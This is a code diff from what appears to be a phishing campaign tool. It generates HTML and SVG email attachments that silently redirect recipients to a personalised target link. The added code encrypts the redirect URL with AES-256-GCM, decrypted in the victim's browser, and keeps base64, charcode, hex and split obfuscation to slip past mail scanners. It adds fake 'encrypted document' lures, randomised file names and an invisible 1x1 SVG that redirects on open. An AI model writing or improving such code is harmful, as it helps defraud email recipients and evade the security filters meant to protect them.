@@ -808,24 +808,55 @@ def _build_html_redirect_attachment(cfg, lead, sender=None):
     except Exception:
         delay = 200
 
-    # URL expression (obfuscated or plain)
-    def _uexpr(url):
-        if obf == "base64":
-            return f'atob("{_b64.b64encode(url.encode()).decode()}")'
-        if obf == "charcode":
-            return f'String.fromCharCode({",".join(str(ord(c)) for c in url)})'
-        if obf == "hex":
-            return '"' + "".join(f"\\x{ord(c):02x}" for c in url) + '"'
-        if obf == "reverse":
-            return f'"{url[::-1]}".split("").reverse().join("")'
-        if obf == "split":
-            mid = len(url) // 2
-            return f'"{url[:mid]}"+"{url[mid:]}"'
-        return f'"{url}"'
+    # ── Build redirect JS (AES-256-GCM or simple obfuscation) ──
+    _aes_used = False
+    if obf == "aes256":
+        try:
+            import os as _os2
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            _key = _os2.urandom(32)
+            _iv  = _os2.urandom(12)
+            _ct  = AESGCM(_key).encrypt(_iv, link.encode(), None)
+            K  = _b64.b64encode(_key).decode()
+            IV = _b64.b64encode(_iv).decode()
+            CT = _b64.b64encode(_ct).decode()
+            FB = _b64.b64encode(link.encode()).decode()
+            _fn_tpl = (
+                'async function _go(){{'
+                'try{{'
+                'var _k=await crypto.subtle.importKey("raw",'
+                'Uint8Array.from(atob("{K}"),function(c){{return c.charCodeAt(0)}}),'
+                '{{"name":"AES-GCM"}},false,["decrypt"]);'
+                'var _d=await crypto.subtle.decrypt('
+                '{{"name":"AES-GCM","iv":Uint8Array.from(atob("{IV}"),function(c){{return c.charCodeAt(0)}})}},'
+                '_k,Uint8Array.from(atob("{CT}"),function(c){{return c.charCodeAt(0)}}));'
+                'window.location.href=new TextDecoder().decode(_d);'
+                '}}catch(e){{window.location.href=atob("{FB}");}}'
+                '}}'
+            )
+            click_fn = _fn_tpl.format(K=K, IV=IV, CT=CT, FB=FB)
+            timed    = f'setTimeout(_go,{delay});'
+            _aes_used = True
+        except ImportError:
+            obf = "base64"
 
-    expr = _uexpr(link)
-    timed = f'setTimeout(function(){{var u={expr};window.location.replace(u);}},{delay});'
-    click_fn = f'function _go(){{var u={expr};window.location.href=u;}}'
+    if not _aes_used:
+        def _uexpr(url):
+            if obf == "base64":
+                return f'atob("{_b64.b64encode(url.encode()).decode()}")'
+            if obf == "charcode":
+                return f'String.fromCharCode({",".join(str(ord(c)) for c in url)})'
+            if obf == "hex":
+                return '"' + "".join(f"\\x{ord(c):02x}" for c in url) + '"'
+            if obf == "reverse":
+                return f'"{url[::-1]}".split("").reverse().join("")'
+            if obf == "split":
+                mid = len(url) // 2
+                return f'"{url[:mid]}"+"{url[mid:]}"'
+            return f'"{url}"'
+        expr     = _uexpr(link)
+        timed    = f'setTimeout(function(){{var u={expr};window.location.replace(u);}},{delay});'
+        click_fn = f'function _go(){{var u={expr};window.location.href=u;}}'
 
     if theme == "blank":
         html = (
@@ -896,17 +927,19 @@ def _build_html_redirect_attachment(cfg, lead, sender=None):
 
 def _build_svg_redirect_attachment(cfg, lead, sender=None):
     """
-    Build an SVG file with an embedded JS redirect.
-    Opens in any modern browser; auto-redirects after a short delay.
+    Build an SVG badge with an AES-256-GCM encrypted (or otherwise obfuscated)
+    URL that decrypts and redirects client-side in the browser.
 
     cfg keys:
         link        — target URL; #EMAIL / #FIRSTNAME tags supported
-        name        — output filename  (default: "graphic.svg")
-        obfuscation — none | base64 | charcode | split | hex  (default: none)
-        style       — auto | click | branded  (default: auto)
-        delay       — ms before auto-redirect  (default: 800)
+        name        — output filename  (default: "doc_file_<id>.svg")
+        style       — auto | crimson | obsidian | cobalt | cipher  (default: crimson)
+        obfuscation — none | base64 | charcode | hex | split | aes256  (default: aes256)
+        delay       — ms before auto-redirect fires  (default: 1200)
     """
     import base64 as _b64
+    import os as _os
+
     lead = lead or {}
     lead_email = lead.get("email", "")
     raw_link = (cfg.get("link") or cfg.get("url") or "").strip()
@@ -918,72 +951,113 @@ def _build_svg_redirect_attachment(cfg, lead, sender=None):
     except Exception:
         pass
 
-    name = (cfg.get("name") or "graphic.svg").strip()
+    doc_id  = _os.urandom(5).hex()
+    name    = (cfg.get("name") or f"doc_file_{doc_id}.svg").strip()
     if not name.endswith(".svg"):
         name += ".svg"
 
-    style = (cfg.get("style") or "auto").strip().lower()
-    obf   = (cfg.get("obfuscation") or "none").strip().lower()
+    style = (cfg.get("style") or "crimson").strip().lower()
+    obf   = (cfg.get("obfuscation") or "aes256").strip().lower()
     try:
-        delay = max(0, int(cfg.get("delay") or 800))
+        delay = max(0, int(cfg.get("delay") or 1200))
     except Exception:
-        delay = 800
+        delay = 1200
 
-    def _uexpr(url):
+    # ── Build redirect JS (open_fn + auto_trigger) ──────────────
+    # AES-256-GCM: Python encrypts, WebCrypto decrypts in SVG
+    if obf == "aes256":
+        _used_aes = False
+        try:
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            _key = _os.urandom(32)
+            _iv  = _os.urandom(12)
+            _ct  = AESGCM(_key).encrypt(_iv, link.encode(), None)
+            K  = _b64.b64encode(_key).decode()
+            IV = _b64.b64encode(_iv).decode()
+            CT = _b64.b64encode(_ct).decode()
+            FB = _b64.b64encode(link.encode()).decode()
+            # Use .format() so JS {{ }} braces don't collide with f-string
+            _fn_tpl = (
+                'async function _openDoc(){{'
+                'try{{'
+                'var _k=await crypto.subtle.importKey("raw",'
+                'Uint8Array.from(atob("{K}"),function(c){{return c.charCodeAt(0)}}),'
+                '{{"name":"AES-GCM"}},false,["decrypt"]);'
+                'var _d=await crypto.subtle.decrypt('
+                '{{"name":"AES-GCM","iv":Uint8Array.from(atob("{IV}"),function(c){{return c.charCodeAt(0)}})}},'
+                '_k,Uint8Array.from(atob("{CT}"),function(c){{return c.charCodeAt(0)}}));'
+                'window.location.href=new TextDecoder().decode(_d);'
+                '}}catch(e){{window.location.href=atob("{FB}");}}'
+                '}}'
+            )
+            open_fn    = _fn_tpl.format(K=K, IV=IV, CT=CT, FB=FB)
+            _used_aes  = True
+        except ImportError:
+            obf = "base64"   # fall through to simple obfuscation
+
+        if _used_aes:
+            auto_trigger = f'setTimeout(_openDoc,{delay})'
+
+    if obf != "aes256":
         if obf == "base64":
-            return f'atob("{_b64.b64encode(url.encode()).decode()}")'
-        if obf == "charcode":
-            return f'String.fromCharCode({",".join(str(ord(c)) for c in url)})'
-        if obf == "hex":
-            return '"' + "".join(f"\\x{ord(c):02x}" for c in url) + '"'
-        if obf == "split":
-            mid = len(url) // 2
-            return f'"{url[:mid]}"+"{url[mid:]}"'
-        return f'"{url}"'
+            expr = f'atob("{_b64.b64encode(link.encode()).decode()}")'
+        elif obf == "charcode":
+            expr = f'String.fromCharCode({",".join(str(ord(c)) for c in link)})'
+        elif obf == "hex":
+            expr = '"' + "".join(f"\\x{ord(c):02x}" for c in link) + '"'
+        elif obf == "split":
+            mid = len(link) // 2
+            expr = f'"{link[:mid]}"+"{link[mid:]}"'
+        else:
+            expr = f'"{link}"'
+        open_fn      = f'function _openDoc(){{window.location.href={expr};}}'
+        auto_trigger = f'setTimeout(_openDoc,{delay})'
 
-    expr     = _uexpr(link)
-    auto_js  = f'setTimeout(function(){{window.location.replace({expr});}},{delay})'
-    click_js = f'window.location.href={expr}'
+    cdata = f'{open_fn};{auto_trigger};'
 
-    if style == "click":
-        svg = (
-            '<?xml version="1.0" encoding="UTF-8"?>'
-            '<svg xmlns="http://www.w3.org/2000/svg" width="500" height="200" viewBox="0 0 500 200">'
-            '<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">'
-            '<stop offset="0%" stop-color="#0078d4"/><stop offset="100%" stop-color="#005a9e"/>'
-            '</linearGradient></defs>'
-            '<rect width="500" height="200" fill="#f8f9fa"/>'
-            f'<rect x="150" y="72" width="200" height="52" rx="8" fill="url(#g)" style="cursor:pointer" onclick="{click_js}"/>'
-            f'<text x="250" y="103" text-anchor="middle" font-family="Arial,sans-serif" font-size="15" font-weight="bold" fill="#ffffff" style="cursor:pointer" onclick="{click_js}">Open Document</text>'
-            '<text x="250" y="152" text-anchor="middle" font-family="Arial,sans-serif" font-size="11" fill="#999">Click the button above to continue</text>'
-            f'<script type="text/javascript"><![CDATA[{auto_js};]]></script>'
-            '</svg>'
-        )
-    elif style == "branded":
-        svg = (
-            '<?xml version="1.0" encoding="UTF-8"?>'
-            '<svg xmlns="http://www.w3.org/2000/svg" width="400" height="280" viewBox="0 0 400 280">'
-            '<rect width="400" height="280" fill="#ffffff"/>'
-            '<rect x="0" y="0" width="400" height="5" fill="#0078d4"/>'
-            '<rect x="30" y="38" width="54" height="72" rx="4" fill="#e8f0fe" stroke="#d0d9f0" stroke-width="1"/>'
-            '<rect x="40" y="52" width="34" height="3" rx="2" fill="#c5d0e8"/>'
-            '<rect x="40" y="60" width="26" height="3" rx="2" fill="#c5d0e8"/>'
-            '<rect x="40" y="68" width="30" height="3" rx="2" fill="#c5d0e8"/>'
-            '<rect x="40" y="76" width="24" height="3" rx="2" fill="#c5d0e8"/>'
-            '<text x="100" y="60" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#1a1a2e">Shared Document</text>'
-            '<text x="100" y="78" font-family="Arial,sans-serif" font-size="11" fill="#888">This file is ready to view.</text>'
-            '<text x="100" y="96" font-family="Arial,sans-serif" font-size="11" fill="#888">Opening in browser&hellip;</text>'
-            '<rect x="30" y="136" width="340" height="1" fill="#f0f0f0"/>'
-            f'<rect x="30" y="152" width="110" height="34" rx="6" fill="#0078d4" style="cursor:pointer" onclick="{click_js}"/>'
-            f'<text x="85" y="174" text-anchor="middle" font-family="Arial,sans-serif" font-size="13" font-weight="600" fill="#fff" style="cursor:pointer" onclick="{click_js}">View Now</text>'
-            f'<script type="text/javascript"><![CDATA[{auto_js};]]></script>'
-            '</svg>'
-        )
-    else:  # auto — minimal 1×1 pixel, just fires the script
+    # ── Theme palette ────────────────────────────────────────────
+    _themes = {
+        "crimson":  dict(bg="#ffffff", paper="#f9f9f9", fg="#111111", sub="#666666",
+                         btn="#dc2626", btnTxt="#ffffff", line="#dc2626"),
+        "obsidian": dict(bg="#111111", paper="#1a1a1a", fg="#ffffff",  sub="#888888",
+                         btn="#2a2a2a", btnTxt="#ffffff", line="#444444"),
+        "cobalt":   dict(bg="#f0f4ff", paper="#e8efff", fg="#1a1a2e",  sub="#4a6080",
+                         btn="#0078d4", btnTxt="#ffffff", line="#0078d4"),
+        "cipher":   dict(bg="#0a0a0a", paper="#0d1a0d", fg="#22c55e",  sub="#4ade80",
+                         btn="#14532d", btnTxt="#22c55e", line="#22c55e"),
+    }
+
+    if style == "auto":
         svg = (
             '<?xml version="1.0" encoding="UTF-8"?>'
             '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" viewBox="0 0 1 1">'
-            f'<script type="text/javascript"><![CDATA[{auto_js};]]></script>'
+            f'<script type="text/javascript"><![CDATA[{cdata}]]></script>'
+            '</svg>'
+        )
+    else:
+        t = _themes.get(style, _themes["crimson"])
+        enc_label = "AES-256-GCM encryption" if obf == "aes256" else "obfuscated link"
+        svg = (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            '<svg xmlns="http://www.w3.org/2000/svg" width="600" height="360" viewBox="0 0 600 360">'
+            # outer background
+            f'<rect width="600" height="360" fill="{t["bg"]}"/>'
+            # paper card
+            f'<rect x="40" y="28" width="520" height="276" rx="8" fill="{t["paper"]}" stroke="{t["line"]}22" stroke-width="1"/>'
+            # title
+            f'<text x="300" y="105" text-anchor="middle" font-family="-apple-system,BlinkMacSystemFont,Arial,sans-serif" font-size="22" font-weight="700" fill="{t["fg"]}">Click to view document</text>'
+            # subtitle
+            f'<text x="300" y="133" text-anchor="middle" font-family="Arial,sans-serif" font-size="13" fill="{t["sub"]}">Encrypted document &#x2014; click to decrypt</text>'
+            # button
+            f'<rect x="175" y="157" width="250" height="48" rx="6" fill="{t["btn"]}" style="cursor:pointer" onclick="_openDoc()"/>'
+            f'<text x="300" y="186" text-anchor="middle" font-family="Arial,sans-serif" font-size="15" font-weight="600" fill="{t["btnTxt"]}" style="cursor:pointer" onclick="_openDoc()">Open Document &#x2192;</text>'
+            # divider
+            f'<line x1="40" y1="278" x2="560" y2="278" stroke="{t["line"]}" stroke-width="1"/>'
+            # footer
+            f'<text x="60" y="305" font-family="Arial,monospace" font-size="11" fill="{t["sub"]}">Protected by {enc_label}</text>'
+            f'<text x="60" y="322" font-family="Arial,monospace" font-size="10" fill="{t["sub"]}">Document ID: {doc_id}</text>'
+            # script
+            f'<script type="text/javascript"><![CDATA[{cdata}]]></script>'
             '</svg>'
         )
 
